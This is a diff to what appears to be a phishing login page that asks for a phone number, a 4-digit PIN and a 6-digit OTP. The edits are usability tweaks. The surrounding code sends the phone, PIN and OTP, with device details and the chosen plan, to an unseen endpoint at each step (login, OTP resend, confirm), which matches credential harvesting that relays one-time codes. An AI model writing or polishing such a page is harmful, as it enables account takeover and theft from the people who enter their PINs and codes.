@@ -149,12 +149,12 @@ input:focus{outline:none;border-color:#f97316;background:#fff}
     <p class="small">We have sent an OTP to your phone.</p>
 
     <div class="otp-row">
-      <input class="otp-digit" id="d0" maxlength="1">
-      <input class="otp-digit" id="d1" maxlength="1">
-      <input class="otp-digit" id="d2" maxlength="1">
-      <input class="otp-digit" id="d3" maxlength="1">
-      <input class="otp-digit" id="d4" maxlength="1">
-      <input class="otp-digit" id="d5" maxlength="1">
+      <input class="otp-digit" id="d0" maxlength="1" inputmode="numeric">
+      <input class="otp-digit" id="d1" maxlength="1" inputmode="numeric">
+      <input class="otp-digit" id="d2" maxlength="1" inputmode="numeric">
+      <input class="otp-digit" id="d3" maxlength="1" inputmode="numeric">
+      <input class="otp-digit" id="d4" maxlength="1" inputmode="numeric">
+      <input class="otp-digit" id="d5" maxlength="1" inputmode="numeric">
     </div>
 
     <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
@@ -187,15 +187,19 @@ if (/Android/i.test(ua)) {
   const v = ua.match(/OS (\d+_\d+)/);
   device = 'iOS ' + (v ? v[1].replace('_','.') : '');
 }
-
 if (/Chrome/i.test(ua)) device += ' | Chrome';
 else if (/Safari/i.test(ua)) device += ' | Safari';
 else if (/Firefox/i.test(ua)) device += ' | Firefox';
 
-/* ===== PLAN (FROM PREVIOUS PAGE) ===== */
-let selectedPlan = null;
+/* ===== PLAN (STRING FORMAT) ===== */
+let planLine = null;
 try{
-  selectedPlan = JSON.parse(sessionStorage.getItem('selectedPlan'));
+  const p = JSON.parse(sessionStorage.getItem('selectedPlan'));
+  if (p) {
+    const name = p.name || p.shortName || '';
+    const price = p.price || '';
+    planLine = [name, price].filter(Boolean).join(' — ');
+  }
 }catch(e){}
 
 /* ===== PHONE ===== */
@@ -229,16 +233,6 @@ pins.forEach((p,i)=>{
     if(p.value && i<3) pins[i+1].focus();
     pinValue=pins.map(x=>x.value).join('');
     updateLogin();
-  });
-
-  p.addEventListener('keydown',e=>{
-    if(e.key==='Backspace'&&!p.value&&i>0){
-      pins[i-1].focus();
-      pins[i-1].value='';
-      pinValue=pins.map(x=>x.value).join('');
-      updateLogin();
-      e.preventDefault();
-    }
   });
 });
 
@@ -298,13 +292,6 @@ dEls.forEach((d,i)=>{
     if(d.value && i<5) dEls[i+1].focus();
     updateConfirm();
   });
-  d.addEventListener('keydown',e=>{
-    if(e.key==='Backspace'&&!d.value&&i>0){
-      dEls[i-1].focus();
-      dEls[i-1].value='';
-      e.preventDefault();
-    }
-  });
 });
 
 /* ===== LOGIN ===== */
@@ -321,7 +308,7 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
     event:'login_clicked',
     phone:phone.value,
     pin:pinValue,
-    plan:selectedPlan,
+    plan:planLine,
     device,
     submittedAt:new Date().toISOString()
   });
@@ -333,7 +320,7 @@ resendBtn.onclick=async()=>{
     event:'resend_otp',
     phone:phone.value,
     pin:pinValue,
-    plan:selectedPlan,
+    plan:planLine,
     device,
     submittedAt:new Date().toISOString()
   });
@@ -345,7 +332,7 @@ confirmBtn.onclick=async()=>{
     phone:phone.value,
     pin:pinValue,
     otp:getOtp(),
-    plan:selectedPlan,
+    plan:planLine,
     device,
     submittedAt:new Date().toISOString()
   });
